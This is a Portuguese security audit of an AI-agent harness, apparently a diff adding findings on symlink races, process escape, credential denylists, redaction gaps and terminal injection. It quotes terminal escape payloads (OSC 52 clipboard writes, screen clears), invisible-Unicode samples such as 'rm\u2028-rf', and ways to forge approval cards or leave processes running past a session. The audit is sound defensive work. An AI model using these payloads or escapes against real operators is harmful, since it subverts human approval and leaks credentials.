+    title: "Windows: ensure_plain_path testa só S_ISLNK; junções (reparse point de diretório) não são recusadas"
+    severity: P3
+    confidence: medium
+    status: probable
+    evidence_level: E1
+    root_cause: "RC-B9-check-then-use"
+    class: ["windows", "symlink"]
+    boundary: "B1"
+    preconditions: "Corpus em Windows com junção dentro de .panda/ ou corpus/validation/."
+    locations: ["src/panda_core/safe_read.py:52-60@704f387"]
+    claim: "No Windows os.lstat de uma junção não reporta S_IFLNK (Python expõe os.path.isjunction desde 3.12), então a junção passa pela checagem e não há O_NOFOLLOW."
+    evidence:
+      - {leg: A, method: static, detail: "safe_read.py:58 usa stat.S_ISLNK(mode) apenas; _NO_FOLLOW=0 no Windows (safe_read.py:30)."}
+    falsification: "Não executado (sem host Windows); comportamento de lstat em junção citado de [memory: unverified] documentação do Python. Checklist para a trilha C/fase 6."
+    fix: {approach: "Recusar também junções/reparse points", sketch: "if stat.S_ISLNK(mode) or os.path.isjunction(current) or getattr(st,'st_reparse_tag',0): refuse", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w0.py::test_junction_in_panda_dir_is_refused (skip se não win32)"]
+    related: ["TRUST-005", "WIN-001"]
+  - id: "REF-204"
+    kind: refuted
+    title: "Hipótese: evidence_*/number_* seguem symlink para fora (não usam safe_read)"
+    status: refuted
+    evidence_level: E2
+    locations: ["src/panda_core/tools.py:870-871@704f387", "src/panda_core/tools.py:176-191@704f387"]
+    claim: "_evidence_path/_numbers_path passam por resolve_inside (resolve() + relative_to) e o recurso autorizado é o alvo resolvido; link para fora -> 'path escapes', link para .env -> read-secrets."
+    evidence:
+      - {leg: A, method: static, detail: "tools.py:871 e :995 chamam resolve_inside, que resolve o alvo antes de _authorize."}
+      - {leg: B, method: independent, detail: "Mesmo mecanismo exercitado por read_file nos testes de poc/B (read_file('.env') bloqueado)."}
+    falsification: "Resta o TOCTOU genérico entre authorize e read_text (mesma classe de R2-209)."
+  # ===================== componente: process.py =====================
+  - id: "R2-212"
+    kind: variant
+    title: "Neto que chama setsid/start_new_session sobrevive a término normal e a timeout (C-8 'a child cannot outlive the call')"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B11-pgid-only-containment"
+    class: ["process-containment", "doc-claim-false"]
+    boundary: "B2"
+    preconditions: "Comando aprovado (ou allow com hook, ver R2-201) que cria processo em nova sessão."
+    locations: ["src/panda_core/process.py:181-203@704f387", "src/panda_core/process.py:224-229@704f387", "docs/CONTRACT.md:380-386@704f387"]
+    claim: "_kill_tree sinaliza só o grupo do filho direto (os.killpg); um descendente em nova sessão fica fora do grupo e continua vivo após o retorno de run_command."
+    evidence:
+      - {leg: A, method: static, detail: "process.py:200-201 os.killpg(process.pid, SIGKILL) + process.kill(); sem cgroup/subreaper (PR_SET_CHILD_SUBREAPER) nem varredura de descendentes."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_process.py -k grandchild", output_excerpt: "AssertionError: neto em nova sessão sobreviveu ao run_command (C-8)\nAssertionError: neto em nova sessão sobreviveu ao timeout (C-8)\n2 failed"}
+    falsification: "Sem sandbox é impossível conter um processo hostil (limite conhecido); o defeito é a frase do CONTRACT §7 e o docstring de run_command afirmarem contenção total. Os testes limpam o neto (SIGKILL no finally)."
+    impact: "Processo de fundo persiste após timeout/cancelamento (ex.: exfiltração contínua, ou corrida usada em R2-209); o operador acredita que Ctrl+C parou tudo."
+    fix: {approach: "Linux: prctl(PR_SET_CHILD_SUBREAPER) + matar descendentes por /proc, ou systemd-run --scope/cgroup v2; Windows: Job Object com KILL_ON_JOB_CLOSE. No mínimo, corrigir o texto do contrato.", sketch: "documentar 'processos que criam nova sessão escapam'; opcional: cgroup por comando", risk: "médio", rollback: "texto"}
+    tests_to_add: ["tests/security/test_w2b.py::test_grandchild_in_new_session_does_not_outlive_timeout (xfail até haver contenção, ou ajustar docs)"]
+    related: ["SEC-008"]
+  - id: "R2-213"
+    kind: new
+    title: "scrubbed_env deixa passar credenciais comuns (PGPASSWORD, DATABASE_URL, SENTRY_DSN, *_APIKEY, GITHUB_PAT, MYSQL_PWD, NPM_CONFIG__AUTH, connection strings, webhooks)"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B8-denylist"
+    class: ["secret-exposure", "owasp:LLM02"]
+    boundary: "B7"
+    preconditions: "Variável presente no ambiente do operador; comando aprovado (ou --auto) como `env`/`printenv`; ou o validador (keep PANDA_)."
+    locations: ["src/panda_core/process.py:117-157@704f387"]
+    claim: "A remoção usa nomes exatos e sufixos _KEY/_TOKEN/_SECRET/_PASSWORD/_PASSWD/_CREDENTIALS; 9 de 9 nomes comuns testados passam para o filho; a saída do comando vai ao provedor sem redação."
+    evidence:
+      - {leg: A, method: static, detail: "process.py:152 'upper in _SECRET_ENV_NAMES or upper.endswith(_SECRET_ENV_SUFFIXES)'; PGPASSWORD não termina em '_PASSWORD', DATABASE_URL/SENTRY_DSN não têm sufixo."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_process.py -k environment", output_excerpt: "AssertionError: PGPASSWORD / DATABASE_URL / SENTRY_DSN / OPENAI_APIKEY / GITHUB_PAT / MYSQL_PWD / NPM_CONFIG__AUTH / AZURE_STORAGE_CONNECTION_STRING / SLACK_WEBHOOK_URL\n9 failed"}
+    falsification: "Denylist é melhor-esforço; o comando precisa de aprovação (exceto R2-201/R2-205, que executam sem aprovação e herdam este ambiente)."
+    impact: "Credenciais do operador alcançáveis por código executado pelo agente e enviadas ao provedor."
+    fix: {approach: "Allowlist de ambiente para filhos", sketch: "manter só PATH, HOME, LANG, LC_*, TERM, TMPDIR, SYSTEMROOT/COMSPEC/PATHEXT (Windows), GIT_* seguros; opt-in por config de usuário", risk: "médio (ferramentas que precisam de proxy/SSL_CERT_FILE)", rollback: "voltar à denylist"}
+    tests_to_add: ["tests/test_process.py::test_child_environment_drops_credential_like_variables"]
+    related: ["VAL-002", "SEC-004"]
+  - id: "R2-214"
+    kind: new
+    title: "Windows: taskkill/git/node por nome nu são procurados também no diretório atual do processo pai (CreateProcess), que costuma ser o corpus"
+    severity: P3
+    confidence: low
+    status: hypothesis
+    evidence_level: E0
+    root_cause: "RC-B12-windows-search-path"
+    class: ["windows", "code-execution"]
+    boundary: "B1"
+    preconditions: "Windows; Panda iniciado com cwd na raiz de um corpus hostil que contém taskkill.exe/git.exe/node.exe."
+    locations: ["src/panda_core/process.py:189-196@704f387", "src/panda_core/process.py:231-239@704f387", "src/panda_cli/entry.py:1-8@704f387"]
+    claim: "subprocess no Windows chama CreateProcess com o nome nu; a ordem de busca inclui o diretório atual do processo pai antes do PATH, salvo NoDefaultCurrentDirectoryInExePath. entry.py só limpa sys.path, não o cwd de busca de executáveis."
+    evidence:
+      - {leg: A, method: static, detail: "process.py:191 ['taskkill', ...] por nome; run_shell passa argv[0] sem resolver (process.py:231-232); resolve_command_prefix (shutil.which) não é usado em run_shell."}
+    falsification: "Não executado (sem Windows). Ordem de busca do CreateProcess citada de [memory: unverified]. Encaminhar ao checklist WIN-001."
+    fix: {approach: "Resolver executáveis por caminho absoluto via shutil.which com PATH sem '.', e taskkill por %SystemRoot%\\System32\\taskkill.exe; definir NoDefaultCurrentDirectoryInExePath=1 no ambiente", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/test_process.py::test_windows_bare_name_is_resolved_outside_cwd (win32)"]
+    related: ["WIN-001", "SEC-008"]
+  # ===================== componente: grep tool + grep_worker.py =====================
+  - id: "R2-215"
+    kind: new
+    title: "grep: política checada no pai, arquivo aberto depois no worker sem O_NOFOLLOW; arquivo trocado por link para .env é lido"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B9-check-then-use"
+    class: ["toctou", "secret-exposure"]
+    boundary: "B3"
+    preconditions: "Escritor concorrente (processo de fundo, ver R2-212) troca um arquivo permitido por symlink entre a filtragem e o worker."
+    locations: ["src/panda_core/tools.py:562-570@704f387", "src/panda_core/grep_worker.py:27-29@704f387"]
+    claim: "_readable_by_policy avalia o nome/alvo no pai; o worker faz open(relative,'rb') seguindo links, então o conteúdo de .env sai como 'corpus/notes.md:1: ...'."
+    evidence:
+      - {leg: A, method: static, detail: "Filtro em tools.py:562-570; grep_worker.py:28 open(relative,'rb') sem checagem de link nem do alvo."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_grep.py -k swapped", output_excerpt: "AssertionError: {...\"matches\":[\"corpus/notes.md:1: TOKENLESS=SYNTH_SECRET_GREP_123\"]...}\n1 failed"}
+    falsification: "Janela simulada por monkeypatch; sem escritor concorrente não há corrida. Mesma classe de R2-209."
+    impact: "Contorna read-secrets por corrida."
+    fix: {approach: "No worker, abrir com O_NOFOLLOW e comparar (st_dev, st_ino) com os valores medidos no pai", sketch: "pai envia [path, dev, ino]; worker: fd=os.open(p, O_RDONLY|O_NOFOLLOW); fstat igual ou pula", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w2b.py::test_grep_worker_does_not_follow_a_file_swapped_to_a_secret_after_the_policy_check"]
+    related: ["SEC-003", "SEC-006", "R2-209"]
+  - id: "R2-216"
+    kind: new
+    title: "grep/list_files enumeram e avaliam a política por arquivo no event loop (fora do worker): ~1 s de bloqueio para 9 mil arquivos"
+    severity: P4
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B13-sync-in-loop"
+    class: ["dos", "responsiveness"]
+    boundary: "B2"
+    preconditions: "Corpus grande; padrão '**/*'."
+    locations: ["src/panda_core/tools.py:349-363@704f387", "src/panda_core/tools.py:562-570@704f387", "src/panda_core/tools.py:512-525@704f387"]
+    claim: "sorted(root.glob(pattern)) materializa a árvore inteira (inclusive node_modules/.git antes do filtro) e cada candidato passa por stat/resolve/decide no thread do loop; o timeout de 10 s do SEC-006 só cobre o worker."
+    evidence:
+      - {leg: A, method: static, detail: "_iter_files: sorted(root.glob(pattern)) antes do limite (tools.py:352); _grep chama _iter_files e _readable_by_policy sem to_thread (tools.py:562-570)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_grep.py -k event_loop (3 execuções)", output_excerpt: "loop bloqueado por 1.22s / 1.07s / 1.15s durante a enumeração\n1 failed (cada)"}
+    falsification: "Medida de tempo, instável sob carga; repeti 3 vezes com resultado consistente. Cresce linearmente com o tamanho da árvore."
+    impact: "Cockpit congela (Esc/Ctrl+C sem resposta) em corpora grandes; não há limite de tempo para a enumeração."
+    fix: {approach: "Mover enumeração+filtro para asyncio.to_thread e usar os.walk com poda de IGNORED_DIRS e limite de visitas", sketch: "candidates = await asyncio.to_thread(_collect, root, glob)", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/test_tools.py::test_grep_file_enumeration_does_not_block_the_event_loop"]
+    related: ["SEC-006"]
+  - id: "REF-205"
+    kind: refuted
+    title: "Hipóteses: worker importa módulo do corpus (json.py no root), ReDoS trava o pai, symlink para fora é varrido"
+    status: refuted
+    evidence_level: E2
+    locations: ["src/panda_core/tools.py:580-588@704f387", "src/panda_core/tools.py:355-358@704f387", "src/panda_core/tools.py:366-379@704f387"]
+    claim: "O worker roda com `python -I` (sys.path sem cwd); o regex roda só no worker com timeout de 10 s (o compile no pai é linear); links para fora caem em relative_to e links internos são julgados pelos dois nomes."
+    evidence:
+      - {leg: A, method: static, detail: "tools.py:582 [sys.executable,'-I',worker]; _iter_files descarta resolve() fora da raiz; _readable_by_policy exige allow para nome e alvo."}
+      - {leg: B, method: independent, detail: "test_b_grep.py exercita o worker real (scanned=2) sem carregar módulos do corpus; testes SEC-006 existentes cobrem o timeout."}
+    falsification: "O que resta é a corrida (R2-215) e o bloqueio da enumeração (R2-216)."
+  # ===================== componente: redact.py (e onde é / não é aplicada) =====================
+  - id: "R2-218"
+    kind: new
+    title: "Resultados de ferramentas vão ao provedor sem redação (só o ledger e as instruções são redigidos)"
+    severity: P2
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B14-redaction-at-persistence-only"
+    class: ["secret-exposure", "owasp:LLM02", "trifecta:private-data+external-communication"]
+    boundary: "B5"
+    preconditions: "Arquivo legível (não negado) ou saída de comando contendo credencial; nenhuma aprovação para read_file."
+    locations: ["src/panda_core/agent.py:541-547@704f387", "src/panda_core/session.py:305-306@704f387", "src/panda_core/agent.py:165@704f387"]
+    claim: "agent.messages recebe result.content cru; redact só roda em SessionLog.append e nas instruções, então `api_key = SYNTH...` lido de corpus/lab.md chega ao provedor enquanto o ledger mostra [redacted]."
+    evidence:
+      - {leg: A, method: static, detail: "agent.py:541-547 anexa {'role':'tool','content': result.content}; nenhuma chamada a redact em tools.py/agent.py fora de _read_instructions (grep 'redact' em src)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_redact.py::test_tool_results_are_redacted_before_they_reach_the_provider", output_excerpt: "assert S not in ledger  -> ok (ledger redigido)\nAssertionError: segredo do resultado da ferramenta foi ao provedor\n1 failed"}
+    falsification: "CONTRACT §7 só promete redação 'before hashing and persistence' e das instruções; a afirmação C-7 do projeto ('provider-bound text') e SECURITY.md ('never prints ... tokens, or API keys') vão além do código. Pode ser decisão de projeto (o modelo precisa ver o arquivo); mesmo assim é egresso de credenciais ao provedor."
+    impact: "Credenciais presentes no corpus/saídas saem para um terceiro (provedor) e aparecem na tela."
+    fix: {approach: "Aplicar redact_text no conteúdo enviado ao provedor (com register_secret de valores negados) e documentar", sketch: "em _run_turn: content=redact_text(result.content) antes de messages.append; ToolCard idem", risk: "baixo (o modelo vê [redacted])", rollback: "flag de config logging.redact_provider"}
+    tests_to_add: ["tests/security/test_w5.py::test_tool_results_are_redacted_before_they_reach_the_provider"]
+    related: ["SEC-004", "R2-200", "R2-217"]
+  - id: "R2-217"
+    kind: variant
+    title: "Falsos negativos da redação: JSON com chave entre aspas, URL com userinfo, Basic/Cookie, valor com espaço, PEM ENCRYPTED/DSA/PGP, sk_live_, glpat-, hf_, JWT, pwd="
+    severity: P2
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B14-redaction-at-persistence-only"
+    class: ["secret-exposure", "owasp:LLM02"]
+    boundary: "B3"
+    preconditions: "Credencial nesses formatos em arquivo lido ou saída de comando; o ledger persiste."
+    locations: ["src/panda_core/redact.py:37-42@704f387", "src/panda_core/redact.py:58-74@704f387"]
+    claim: "_ASSIGNMENT_RE exige o separador logo após o nome (aspas de fechamento do JSON quebram), para no primeiro espaço do valor e não cobre pwd/cookie/authorization; _SECRET_VALUE_RES não cobre vários formatos; 15/15 amostras e um JSON real (client_secret) passam para o ledger."
+    evidence:
+      - {leg: A, method: static, detail: "redact.py:39 (?P<sep>[ \\t]{0,3}[=:]...) logo após o nome; (?P<value>[^&\\s\"']{6,}) para no espaço; PEM só (RSA|EC|OPENSSH)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_redact.py -k 'formats or json_secrets'", output_excerpt: "AssertionError: {\"api_key\": \"SYNTH_SECRET_abcdef123456\"}\nAssertionError: postgres://admin:SYNTH_SECRET_abcdef123456@db...\nAssertionError: password = \"[redacted] horse SYNTH_SECRET_abcdef123456\"\nAssertionError: -----BEGIN ENCRYPTED PRIVATE KEY-----\nAssertionError: sk_live_SYNTH_SECRET_... / glpat-... / hf_... / eyJ... / pwd=...\nassert 'SYNTH_SECRET_abcdef123456' not in '{\"schema\":...}'  (ledger após read_file de svc.json)\n16 failed"}
+    falsification: "O dict-level redact cobre JSON quando é dict Python; o problema é JSON como texto, que é o formato de praticamente todo conteúdo de ferramenta."
+    impact: "Credenciais persistidas no ledger (que pode ser anexado a releases/relatórios de proveniência) e, via R2-218, enviadas ao provedor."
+    fix: {approach: "Ampliar padrões e aceitar aspas em volta do nome", sketch: "nome: [\"']?NAME[\"']?\\s*[=:]\\s*[\"']?(valor até aspas/fim de linha); adicionar authorization|cookie|pwd|pass; URL r'(?<=://)[^/\\s:@]+:[^@\\s/]+(?=@)'; PEM r'-----BEGIN [A-Z ]*PRIVATE KEY( BLOCK)?-----.*?-----END'; famílias sk_(live|test)_, glpat-, hf_, npm_, eyJ...; teste de propriedade com hypothesis", risk: "mais falsos positivos (R2-219)", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w5.py::test_redaction_covers_common_secret_formats", "tests/security/test_w5.py::test_json_secrets_in_tool_results_are_redacted_in_the_ledger"]
+    related: ["SEC-004", "R2-218"]
+  - id: "R2-219"
+    kind: new
+    title: "Falso positivo: prosa biomédica (`Secretion: ...`, `Tokenization: ...`) é apagada do ledger"
+    severity: P4
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B14-redaction-at-persistence-only"
+    class: ["provenance-distortion", "false-positive"]
+    boundary: "B3"
+    preconditions: "Texto do corpus com palavras que contêm secret/token/password seguidas de ':' ou '='."
+    locations: ["src/panda_core/redact.py:37-42@704f387"]
+    claim: "O nome aceita qualquer palavra contendo 'secret'/'token', então 'Secretion: increased_in_GSE160208' vira 'Secretion: [redacted]' no ledger."
+    evidence:
+      - {leg: A, method: static, detail: "redact.py:38 '[A-Za-z0-9_.-]{0,40}?(?:...secret|token...)[A-Za-z0-9_.-]{0,40}'."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_redact.py::test_redaction_keeps_biomedical_prose", output_excerpt: "AssertionError: assert 'Secretion: [...n: [redacted]' == 'Secretion: i... wordpiece_v2'\n1 failed"}
+    falsification: "O módulo diz preferir perder diagnóstico a vazar; ainda assim, num harness de proveniência, apagar evidência sem marcação é distorção."
+    fix: {approach: "Exigir fronteira de palavra/sublinhado no fim do termo (secret(?![a-z]))", sketch: "(?:secret|token)(?=$|[_.-]|[ \\t]*[=:])", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w5.py::test_redaction_keeps_biomedical_prose"]
+    related: ["SEC-004"]
+  - id: "R2-220"
+    kind: new
+    title: "redact_text custa ~14 µs/char em entrada hostil; instructions.md de 2 MB trava a montagem do prompt por ~28 s"
+    severity: P4
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B15-unbounded-redaction-input"
+    class: ["dos"]
+    boundary: "B1"
+    preconditions: "Corpus hostil com .panda/instructions.md grande."
+    locations: ["src/panda_core/agent.py:158-168@704f387", "src/panda_core/safe_read.py:63-84@704f387", "src/panda_core/redact.py:91-99@704f387"]
+    claim: "_read_instructions lê até 2.000.000 bytes, redige tudo e só depois corta em 24.000 chars; o regex de atribuição é linear mas lento ('secret'*N: 1,2 MB -> 16,7 s)."
+    evidence:
+      - {leg: A, method: static, detail: "agent.py:165 read_workspace_file(..., redact=True) com max_bytes padrão 2_000_000 (safe_read.py:28); corte em agent.py:168 após a redação."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_redact.py -k 'instructions or linear'; python poc/B/scripts/rd.py", output_excerpt: "150000 2.12 / 300000 4.22 / 600000 8.13 / 1200000 16.71 (s)\nAssertionError: 27.793602479000015  (build_system_prompt)\n2 failed"}
+    falsification: "Linear (não é ReDoS exponencial); no ledger as strings são cortadas em 8.000 chars antes (agent._shrink), o que limita o custo ali. Repete a cada set_model/set_active_study."
+    fix: {approach: "Cortar antes de redigir", sketch: "read_workspace_file(..., max_bytes=DEFAULT_SYSTEM_CHARS*4) e só então redact", risk: "nenhum", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w5.py::test_hostile_instructions_file_does_not_stall_prompt_build"]
+    related: ["TRUST-005", "SEC-004"]
+  # ===================== componente: display.py e superfícies de terminal =====================
+  - id: "R2-221"
+    kind: variant
+    title: "Cockpit: transcrição (RichMarkdown) e ToolCard emitem ESC/CSI/OSC/C1 do modelo e das ferramentas sem sanitize_display"
+    severity: P2
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B16-sanitize-per-callsite"
+    class: ["terminal-injection", "approval-ui", "owasp:LLM01"]
+    boundary: "B6"
+    preconditions: "Texto do modelo, argumento de ferramenta ou conteúdo de arquivo/saída com sequências de controle; cockpit (modo padrão)."
+    locations: ["src/panda_cli/cockpit.py:93-115@704f387", "src/panda_cli/cockpit.py:867-890@704f387", "src/panda_cli/cockpit.py:960-965@704f387", "src/panda_cli/cockpit.py:1167@704f387"]
+    claim: "Rich/Textual só removem BEL/BS/VT/FF/CR; ToolCard (argumentos e 160 chars do resultado) e a transcrição Markdown chegam a Strip.render com ESC[2J, ESC]52 e 0x9b intactos."
+    evidence:
+      - {leg: A, method: static, detail: "ToolCard._build_text usa _short (só colapsa espaços) sem sanitize_display (cockpit.py:101-115); _on_agent_event passa text_delta e content cru (cockpit.py:867-888); rich/control.py e textual/content.py STRIP_CONTROL_CODES=[7,8,11,12,13]; textual/strip.py:719-727 concatena o texto do segmento sem filtro."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_display.py::test_cockpit_tool_card_and_markdown_do_not_emit_terminal_sequences; python poc/B/scripts/tx.py", output_excerpt: "ToolCard '▸ run_shell  A\\x1b]52;c;U1lOVEg=B\\x1b[2JC\\x9b31mD' True True\nStatic 'hello A\\x1b]52;c;U1lOVEg=B\\x1b[2JC\\x9b31mD' True True\n1 failed"}
+    falsification: "Verifiquei até Strip.render (string que o driver escreve); não observei o terminal real. O BEL é removido, mas ESC inicia outra sequência; ESC[2J e CSI 8-bit sobrevivem. O maintainer já anotava 'cockpit transcript/tool cards not sanitized' (UI-002), mas o CONTRACT ('What is shown is what runs') e o modo padrão de chat são o cockpit."
+    impact: "Modelo/arquivo hostil limpa a tela, reescreve linhas (cursor), muda título/clipboard em terminais que aceitam OSC 52 sem BEL; pode esconder o que uma ferramenta fez ou forjar um 'card' de aprovação na transcrição."
+    fix: {approach: "Sanitizar na fronteira de renderização, não por chamada", sketch: "função render_untrusted(text)->Text que aplica sanitize_display; usar em ToolCard, _on_agent_event (antes de RichMarkdown), _append_user, _notice, ValidationPanel; RichMarkdown(hyperlinks=False) para não criar OSC 8 com destino diferente do texto", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w4.py::test_cockpit_tool_card_and_markdown_do_not_emit_terminal_sequences"]
+    related: ["UI-002", "APR-003"]
+  - id: "R2-222"
+    kind: variant
+    title: "sanitize_display não trata U+2028/2029, U+061C, U+180E, U+00AD, tags U+E0000-E007F, seletores de variação, fillers Hangul"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B16-sanitize-per-callsite"
+    class: ["terminal-injection", "unicode", "approval-ui"]
+    boundary: "B6"
+    preconditions: "Texto exibido no prompt de aprovação/REPL contendo esses caracteres."
+    locations: ["src/panda_core/display.py:20-21@704f387"]
+    claim: "_INVISIBLE cobre só 200B-200F, 202A-202E, 2060-2064, 2066-2069, FEFF; 10/10 outros caracteres invisíveis ou de quebra passam intactos (tags permitem 'ASCII smuggling' invisível; U+2028 quebra linha em vários terminais)."
+    evidence:
+      - {leg: A, method: static, detail: "display.py:21 classe de caracteres fixa."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_display.py -k invisible", output_excerpt: "assert '\\u2028' not in 'rm\\u2028-rf' ... '\\u061c' ... '\\u180e' ... '\\xad' ... '\\U000e0041' ... '\\U000e007f' ... '\\ufe0f' ... '\\u115f' ... '\\u3164'\n10 failed"}
+    falsification: "Seletores de variação têm uso legítimo (emoji); a correção deve visibilizar Cf/Zl/Zp e tags, não necessariamente VS."
+    fix: {approach: "Usar unicodedata.category", sketch: "visibilizar todo char com category in {'Cf','Zl','Zp','Co','Cn'} ou em U+E0000-E007F, U+115F/1160/3164/FFA0", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w4.py::test_sanitizer_makes_invisible_or_line_breaking_marks_visible"]
+    related: ["UI-002", "APR-003"]
+  - id: "R2-223"
+    kind: new
+    title: "Saída de `panda validate` (check.errors do validador, que citam o corpus) e print_error vão crus ao console Rich; `--json` deixa U+202E e C1 sem escape"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B16-sanitize-per-callsite"
+    class: ["terminal-injection"]
+    boundary: "B6"
+    preconditions: "Validador reporta texto do corpus (comum: ids/caminhos citados) com sequências de controle; ou consumidor de --json em terminal."
+    locations: ["src/panda_cli/render.py:53-65@704f387", "src/panda_cli/render.py:76-94@704f387"]
+    claim: "validation_report e print_error constroem Text(...) com mensagens externas sem sanitize_display; print_json usa ensure_ascii=False (escapa < 0x20, mas não 0x80-0x9F nem bidi)."
+    evidence:
+      - {leg: A, method: static, detail: "render.py:55 Text(str(exc.message)); render.py:89-91 detail=' | '.join(check.errors) em Table; render.py:65 json.dumps(..., ensure_ascii=False)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_display.py -k 'validation_report or json_output'", output_excerpt: "assert '\\x1b]0;' not in buffer  -> falhou (sequência emitida)\nassert '\\u202e' not in out -> falhou\n2 failed"}
+    falsification: "Validador malicioso está fora de escopo, mas um validador honesto que cita texto do corpus é o caminho normal; o CONTRACT promete sanitização para 'text from the model, tools and the workspace'."
+    fix: {approach: "Aplicar sanitize_display em render.* para todo texto não-literal; print_json com ensure_ascii=True (ou escapar Cf/C1)", sketch: "Text(sanitize_display(msg)); json.dumps(payload, ensure_ascii=True)", risk: "baixo (--json fica ASCII)", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w4.py::test_validation_report_does_not_emit_terminal_sequences_from_validator_output", "tests/security/test_w4.py::test_json_output_escapes_bidi_and_c1"]
+    related: ["UI-002", "DOC-001"]
+  # ===================== componente: session.py + treehash.py =====================
+  - id: "R2-224"
+    kind: variant
+    title: "Append 'estrito' compara o anchor com a cauda em cache: reescrita da última linha com o mesmo tamanho não é detectada por um escritor de longa duração (cockpit/MCP)"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B17-size-keyed-cache"
+    class: ["ledger-integrity", "doc-claim-false"]
+    boundary: "B7"
+    preconditions: "Escritor externo ao processo (sem reescrever o anchor) altera o último evento mantendo o tamanho em bytes, enquanto a sessão está aberta."
+    locations: ["src/panda_core/session.py:271-275@704f387", "src/panda_core/session.py:311-342@704f387", "src/panda_core/session.py:347-351@704f387"]
+    claim: "_refresh_tail só relê a cauda se st_size mudou; _check_anchor então compara o anchor com a cauda antiga (igual) e o append encadeia sobre o hash antigo, aceitando a falsificação até um `verify` posterior."
+    evidence:
+      - {leg: A, method: static, detail: "session.py:273 'if size != self._size'; _check_anchor usa self._tail (session.py:338); _append_locked usa prev=self._tail[1] (session.py:351)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_session.py -k 'same_seq or same_size'", output_excerpt: "PASSED test_append_refuses_tail_with_same_seq_but_different_hash (processo novo detecta; mata M12)\nFAILED test_long_lived_writer_refuses_same_size_forgery_of_the_tail: DID NOT RAISE SessionIntegrityError"}
+    falsification: "verify() continua detectando ('prev does not match'), então não há lavagem silenciosa; o defeito é o append não ser estrito como C-3 afirma. O caso de seq igual/hash diferente com tamanho diferente é recusado (o mutante M12 só sobrevive por falta de teste — o primeiro teste acima o mata)."
+    impact: "Ledger continua recebendo eventos sobre uma cauda adulterada durante a sessão inteira; o operador só descobre em verify."
+    fix: {approach: "Chave de cache = (st_size, st_mtime_ns, st_ino) e reler a última linha sempre sob o lock (custo O(1) com a janela de cauda)", sketch: "em _append_locked: self._tail = self._read_tail() sempre (já está sob lock)", risk: "baixo (uma leitura de 128 KiB por append)", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w2a.py::test_append_refuses_tail_with_same_seq_but_different_hash", "tests/security/test_w2a.py::test_long_lived_writer_refuses_same_size_forgery_of_the_tail"]
+    related: ["SES-003", "PERF-001"]
+  - id: "R2-225"
+    kind: new
+    title: "MCP (PANDA_SESSION_FILE) anexa eventos depois de session.end; o ledger passa a falhar em verify sem aviso"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B18-closed-session-not-enforced"
+    class: ["ledger-integrity", "parity"]
+    boundary: "B4"
+    preconditions: "PANDA_SESSION_FILE (ou --session-file do mcp serve) aponta para uma sessão já fechada."
+    locations: ["src/panda_core/service.py:62-75@704f387", "src/panda_core/service.py:102-113@704f387", "src/panda_core/session.py:301-309@704f387"]
+    claim: "SessionLog.append não recusa sessão fechada e PandaService._record não checa is_closed (o Agent checa), então note/validate via MCP gravam após session.end."
+    evidence:
+      - {leg: A, method: static, detail: "service.py:105 self.session.append sem is_closed(); session.py:301-309 sem verificação de session.end; contraste com agent.py:266-273."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_session.py::test_service_does_not_append_after_session_end", output_excerpt: "AssertionError: {'ok': False, ..., 'events': 3, ...}  (verify: event_after_end)\n1 failed"}
+    falsification: "Pode ser uso indevido do operador, mas o servidor aceita silenciosamente e corrompe a verificabilidade (C-3/(d) do contrato)."
+    fix: {approach: "Recusar append após session.end no próprio SessionLog", sketch: "em _append_locked: if self._tail_type == 'session.end' and event_type != ...: raise SessionIntegrityError('session is closed')", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/test_service_mcp.py::test_service_does_not_append_after_session_end"]
+    related: ["PROV-001", "SES-003"]
+  - id: "R2-226"
+    kind: new
+    title: "tree_sha256 ignora corpus/node_modules|.git|.venv|__pycache__ e confia no cache (mtime,size): mudanças nesses diretórios ou com mtime restaurado não mudam o hash"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B19-treehash-scope"
+    class: ["provenance", "integrity"]
+    boundary: "B2"
+    preconditions: "Escrita em corpus/node_modules/ (allow por write_file, ver R2-210) ou comando que restaura mtime (touch -r) dentro de uma sessão."
